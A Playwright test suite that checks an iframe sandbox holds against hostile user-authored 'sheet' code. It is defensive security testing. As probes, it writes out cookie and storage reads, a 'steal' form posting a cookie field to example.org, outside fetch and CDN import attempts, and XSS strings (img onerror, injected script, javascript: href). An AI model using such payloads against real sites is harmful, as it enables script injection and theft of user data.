import { expect, test, type Page } from '@playwright/test';
// The client has no package entry for this: the builder is pure TS with no `@/` import, so
// Playwright transpiles it in place (docs/context/sheets/sandbox.md).
import { buildSheetSrcdoc } from '../../client/src/sheet-sandbox/sheet-srcdoc';

// A routed https origin (never reaches the network) with a cookie and storage of its own: the
// hostile sheet must not read them, and every request it makes would show up in `page.on`.
const HOST_URL = 'https://sheet-host.lorkarium.test/';
const OUTSIDE = 'https://example.org';
const HOST_SECRET = 'lorkarium-probe=host-secret';
// The same parent policy as client/index.html: it is what stops the frame navigating itself out.
const APP_FRAME_POLICY = `<meta http-equiv="Content-Security-Policy" content="frame-src 'self'">`;
// The sheet policy before the script hashes: any inline script ran, `on*` attributes included.
// Only the negative control uses it, to prove the probes below would see a handler run.
const INLINE_SHEET_POLICY =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'; base-uri 'none'";
// How long a probe waits for a handler that must not run before it reports.
const QUIET_MS = 500;

// Plays the SheetFrame of the client: the same attributes, the port on the first load and
// "Ficha recarregada" on the second. Probes report by `parent.postMessage`, which crosses origins.
function hostPage(srcdoc: string, parentPolicy: string): string {
  const embedded = JSON.stringify(srcdoc).replace(/</g, '\\u003c');
  return `<!doctype html><html><head><meta charset="utf-8">${parentPolicy}<title>Sheet host</title></head><body>
<h1>Sheet host</h1><div id="slot"></div>
<script>
document.cookie = '${HOST_SECRET}';
localStorage.setItem('lorkarium-probe', 'host-secret');
window.sheetProbes = {};
window.sheetLoads = 0;
const frame = document.createElement('iframe');
frame.title = 'Ficha hostil';
frame.setAttribute('sandbox', 'allow-scripts');
frame.setAttribute('allow', '');
frame.setAttribute('referrerpolicy', 'no-referrer');
addEventListener('message', (event) => {
  if (event.source !== frame.contentWindow || typeof event.data !== 'object') return;
  window.sheetProbes[event.data.probe] = event.data.outcome;
});
frame.addEventListener('load', () => {
  window.sheetLoads += 1;
  if (window.sheetLoads === 1) {
    const channel = new MessageChannel();
    window.sheetRequests = [];
    channel.port1.onmessage = (event) => {
      const image = event.data.image;
      window.sheetRequests.push({ type: event.data.type, bytes: image ? image.bytes.byteLength : null });
      channel.port1.postMessage({ type: 'result', requestId: event.data.requestId });
    };
    frame.contentWindow.postMessage({ type: 'lorkarium:port' }, '*', [channel.port2]);
    return;
  }
  frame.remove();
  const notice = document.createElement('p');
  notice.setAttribute('role', 'status');
  notice.textContent = 'Ficha recarregada';
  document.body.append(notice);
});
frame.srcdoc = ${embedded};
document.getElementById('slot').append(frame);
</script></body></html>`;
}

// `report` exists only inside the probe: it is the author's code, not the SDK.
function probeSource(js: string): string {
  return `function report(probe, outcome) { parent.postMessage({ probe, outcome: String(outcome) }, '*'); }\n${js}`;
}

// Counts what reaches the network layer. A load the CSP refuses still fires `page.on('request')`
// in Chromium (then fails with `csp`) but never reaches a route, so the route is the honest probe.
type HostileSheetOptions = Readonly<{
  html?: string;
  parentPolicy?: string;
  /** Swaps the sheet policy of the srcdoc; only the negative controls pass it. */
  sheetPolicy?: string;
}>;

const SHEET_POLICY_META = /<meta http-equiv="Content-Security-Policy" content="[^"]*">/;

function hostileSrcdoc(js: string, html: string, sheetPolicy: string | undefined): string {
  const files = [
    { path: 'index.html', content: html },
    { path: 'script.js', content: probeSource(js) },
  ];
  const srcdoc = buildSheetSrcdoc({ files });
  return sheetPolicy === undefined
    ? srcdoc
    : srcdoc.replace(
        SHEET_POLICY_META,
        `<meta http-equiv="Content-Security-Policy" content="${sheetPolicy}">`,
      );
}

async function openHostileSheet(
  page: Page,
  js: string,
  { html = '', parentPolicy = APP_FRAME_POLICY, sheetPolicy }: HostileSheetOptions = {},
): Promise<string[]> {
  const outside: string[] = [];
  await page.context().route(
    (url) => !url.href.startsWith(HOST_URL),
    (route) => {
      outside.push(route.request().url());
      return route.abort();
    },
  );
  const srcdoc = hostileSrcdoc(js, html, sheetPolicy);
  await page.route(HOST_URL, (route) =>
    route.fulfill({ status: 200, contentType: 'text/html', body: hostPage(srcdoc, parentPolicy) }),
  );
  await page.goto(HOST_URL);
  return outside;
}

async function outcomeOf(page: Page, probe: string): Promise<string> {
  const read = (): Promise<string | null> =>
    page.evaluate<string | null>(`window.sheetProbes[${JSON.stringify(probe)}] ?? null`);
  await expect.poll(read).not.toBeNull();
  return (await read()) as string;
}

test.describe('sheet sandbox: a hostile sheet', () => {
  test('the SDK is up and its port reaches the host, so the probes below are live', async ({
    page,
  }) => {
    await openHostileSheet(
      page,
      `lorkarium.ready().then(() => report('sdk', 'ready'), (e) => report('sdk', e.name));`,
    );
    expect(await outcomeOf(page, 'sdk')).toBe('ready');
  });

  test('reading parent.document throws SecurityError', async ({ page }) => {
    await openHostileSheet(
      page,
      `try { report('parent-document', parent.document.title); } catch (e) { report('parent-document', e.name); }`,
    );
    expect(await outcomeOf(page, 'parent-document')).toBe('SecurityError');
  });

  test('reading top.location.href throws SecurityError', async ({ page }) => {
    await openHostileSheet(
      page,
      `try { report('top-href', top.location.href); } catch (e) { report('top-href', e.name); }`,
    );
    expect(await outcomeOf(page, 'top-href')).toBe('SecurityError');
  });

  test('document.cookie throws or is empty, never the host cookie', async ({ page }) => {
    await openHostileSheet(
      page,
      `try { report('cookie', 'value:' + document.cookie); } catch (e) { report('cookie', e.name); }`,
    );
    expect(['SecurityError', 'value:']).toContain(await outcomeOf(page, 'cookie'));
    expect(await page.evaluate<string>('document.cookie')).toContain(HOST_SECRET);
  });

  test('localStorage throws or is empty, never the host storage', async ({ page }) => {
    await openHostileSheet(
      page,
      `try { report('storage', 'keys:' + localStorage.length + ':' + localStorage.getItem('lorkarium-probe')); } catch (e) { report('storage', e.name); }`,
    );
    expect(['SecurityError', 'keys:0:null']).toContain(await outcomeOf(page, 'storage'));
  });

  test('fetch to an outside site fails without any request', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `fetch('${OUTSIDE}/fetch').then(() => report('fetch', 'reached'), (e) => report('fetch', e.name));`,
    );
    expect(await outcomeOf(page, 'fetch')).toBe('TypeError');
    expect(outside).toEqual([]);
  });

  test('an outside image fails without any request', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `const image = new Image(); image.onload = () => report('image', 'loaded'); image.onerror = () => report('image', 'blocked'); image.src = '${OUTSIDE}/pixel.png';`,
    );
    expect(await outcomeOf(page, 'image')).toBe('blocked');
    expect(outside).toEqual([]);
  });

  test('an outside font stylesheet fails without any request', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '${OUTSIDE}/font.css'; link.onload = () => report('font', 'loaded'); link.onerror = () => report('font', 'blocked'); document.head.append(link);`,
    );
    expect(await outcomeOf(page, 'font')).toBe('blocked');
    expect(outside).toEqual([]);
  });

  test('import() from a CDN fails without any request', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `import('https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/lodash.js').then(() => report('import', 'loaded'), (e) => report('import', e.name));`,
    );
    expect(await outcomeOf(page, 'import')).toBe('TypeError');
    expect(outside).toEqual([]);
  });

  test('window.open is blocked and no window opens', async ({ page, context }) => {
    let popups = 0;
    context.on('page', () => (popups += 1));
    const outside = await openHostileSheet(
      page,
      `report('open', window.open('${OUTSIDE}/popup'));`,
    );
    expect(await outcomeOf(page, 'open')).toBe('null');
    expect(popups).toBe(0);
    expect(outside).toEqual([]);
  });

  test('form.submit() is blocked and the frame stays on its first load', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `const form = document.getElementById('steal'); form.submit(); setTimeout(() => report('form', 'still-here'), 500);`,
      {
        html: `<form id="steal" action="${OUTSIDE}/form" method="get"><input name="cookie" value="x"></form>`,
      },
    );
    expect(await outcomeOf(page, 'form')).toBe('still-here');
    expect(await page.evaluate<number>('window.sheetLoads')).toBe(1);
    expect(outside).toEqual([]);
  });

  test('top.location = … is refused and the host page stays', async ({ page }) => {
    const outside = await openHostileSheet(
      page,
      `try { top.location = '${OUTSIDE}/top'; report('top-navigate', 'assigned'); } catch (e) { report('top-navigate', e.name); }`,
    );
    expect(await outcomeOf(page, 'top-navigate')).toBe('SecurityError');
    expect(page.url()).toBe(HOST_URL);
    await expect(page.getByRole('heading', { name: 'Sheet host' })).toBeVisible();
    expect(outside).toEqual([]);
  });

  test('the frame navigating itself is destroyed on its second load, with no request out', async ({
    page,
  }) => {
    const outside = await openHostileSheet(
      page,
      `setTimeout(() => { location = '${OUTSIDE}/self'; }, 100);`,
    );
    await expect(page.getByRole('status')).toHaveText('Ficha recarregada');
    await expect(page.getByTitle('Ficha hostil')).toHaveCount(0);
    expect(outside).toEqual([]);
  });

  test('without the parent frame-src the self navigation does leave: the policy is the guard', async ({
    page,
  }) => {
    const outside = await openHostileSheet(
      page,
      `setTimeout(() => { location = '${OUTSIDE}/self'; }, 100);`,
      { parentPolicy: '' },
    );
    await expect(page.getByRole('status')).toHaveText('Ficha recarregada');
    expect(outside).toEqual([`${OUTSIDE}/self`]);
  });
});

// Html that arrives from the sheet's data (a rich text a player saved) and that the author's code
// shows. Each probe reports `window.leaked` after a quiet moment: `blocked` means nothing the
// html carried ran.
const LEAK_REPORT = `setTimeout(() => report('leak', window.leaked ?? 'blocked'), ${QUIET_MS});`;
const ONERROR_IMAGE = `<img src="x" onerror="window.leaked = 'onerror'">`;
const INNER_SCRIPT = `<script>window.leaked = 'inner-script'</script>`;
const JAVASCRIPT_LINK = `<a id="link" href="javascript:void(window.leaked = 'href')">x</a>`;

function showsHtml(html: string): string {
  return `document.body.innerHTML = ${JSON.stringify(html)};`;
}

test.describe('sheet sandbox: html from the data does not run', () => {
  test('an onerror attribute set through innerHTML does not run', async ({ page }) => {
    await openHostileSheet(page, `${showsHtml(ONERROR_IMAGE)} ${LEAK_REPORT}`);
    expect(await outcomeOf(page, 'leak')).toBe('blocked');
  });

  test('a script element inserted through innerHTML does not run', async ({ page }) => {
    await openHostileSheet(page, `${showsHtml(INNER_SCRIPT)} ${LEAK_REPORT}`);
    expect(await outcomeOf(page, 'leak')).toBe('blocked');
  });

  test("a script element created by the sheet's code does not run", async ({ page }) => {
    await openHostileSheet(
      page,
      `const script = document.createElement('script'); script.textContent = "window.leaked = 'created-script'"; document.body.append(script); ${LEAK_REPORT}`,
    );
    expect(await outcomeOf(page, 'leak')).toBe('blocked');
  });

  test('a javascript: href does not run when the link is followed', async ({ page }) => {
    await openHostileSheet(
      page,
      `${showsHtml(JAVASCRIPT_LINK)} document.getElementById('link').click(); ${LEAK_REPORT}`,
    );
    expect(await outcomeOf(page, 'leak')).toBe('blocked');
  });

  test('under the inline policy of before the hashes the same onerror runs: the hashes are the guard', async ({
    page,
  }) => {
    await openHostileSheet(page, `${showsHtml(ONERROR_IMAGE)} ${LEAK_REPORT}`, {
      sheetPolicy: INLINE_SHEET_POLICY,
    });
    expect(await outcomeOf(page, 'leak')).toBe('onerror');
  });
});

// The sheet reads an image the viewer picks or pastes inside the frame, with no host dialog: a
// sandboxed frame without allow-same-origin still owns its own file input and paste event. If the
// browser ever refused, the host would have to open the picker itself.
const IMAGE_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const PICK_HTML = `<input type="file" id="pick" accept="image/*">`;
const READ_PICKED = `document.getElementById('pick').addEventListener('change', (event) => {
  const file = event.target.files[0];
  const reader = new FileReader();
  reader.onload = () => report('picked', reader.result.byteLength + ' ' + file.type);
  reader.readAsArrayBuffer(file);
  lorkarium.assets.upload(file).then(() => report('upload', 'sent'), (e) => report('upload', e.code));
});`;
const READ_PASTED = `document.addEventListener('paste', (event) => {
  const files = event.clipboardData ? event.clipboardData.files : [];
  report('pasted', files.length + ' ' + (files[0] ? files[0].type : 'none'));
});
report('listening', 'yes');`;

// A string, as the e2e compiles with no DOM types. Playwright evaluates a string as an expression
// and never calls a function it yields, so the expression makes the call itself.
function pasteImageExpression(bytes: Buffer): string {
  return `(() => {
  const transfer = new DataTransfer();
  transfer.items.add(new File([new Uint8Array(${JSON.stringify([...bytes])})], 'colado.png', { type: 'image/png' }));
  document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: transfer, bubbles: true }));
})()`;
}

function sheetFrame(page: Page) {
  return page.frameLocator('iframe[title="Ficha hostil"]');
}

test.describe('sheet sandbox: images chosen inside the frame', () => {
  test('a file chosen in the frame reaches its FileReader and goes to the host as bytes', async ({
    page,
  }) => {
    await openHostileSheet(page, READ_PICKED, { html: PICK_HTML });
    await sheetFrame(page)
      .locator('#pick')
      .setInputFiles({ name: 'retrato.png', mimeType: 'image/png', buffer: IMAGE_BYTES });
    expect(await outcomeOf(page, 'picked')).toBe(`${IMAGE_BYTES.length} image/png`);
    expect(await outcomeOf(page, 'upload')).toBe('sent');
    expect(await page.evaluate('window.sheetRequests')).toContainEqual({
      type: 'assets.upload',
      bytes: IMAGE_BYTES.length,
    });
  });

  test('an image pasted in the frame arrives in clipboardData.files', async ({ page }) => {
    await openHostileSheet(page, READ_PASTED);
    expect(await outcomeOf(page, 'listening')).toBe('yes');
    await sheetFrame(page).locator('body').evaluate(pasteImageExpression(IMAGE_BYTES));
    expect(await outcomeOf(page, 'pasted')).toBe('1 image/png');
  });
});
